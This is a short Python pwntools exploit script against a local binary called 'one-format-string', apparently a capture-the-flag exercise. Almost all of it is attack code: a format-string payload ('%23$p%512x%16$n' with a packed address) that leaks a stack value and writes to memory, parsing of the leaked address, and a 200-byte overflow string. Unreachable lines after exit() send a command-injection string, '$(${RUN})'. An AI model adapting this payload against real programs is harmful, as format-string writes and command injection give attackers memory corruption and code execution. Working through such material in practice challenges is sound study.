#!/usr/bin/env python

from pwn import *
import os

p = process ("./one-format-string")

addr = 0x601060

print(hex(addr))

buf = "%23$p%512x%16$n"
buf += "B"
print(len(buf))
buf += p64(addr)

with open("e.txt", "w") as f:
    f.write(buf)
    f.close()

#buf = "%p " *50
p.sendline(buf)

data = p.recv()
print(repr(data))



addr_temp = data[546:554]
print (repr(addr_temp))

addr_temp = u64(addr_temp)
print(hex(addr_temp))


buf = "A" *200

p.sendline(buf)
print(p.recv())

exit()


print (p.recv())
p.sendline('$(${RUN})')
print (p.recv())
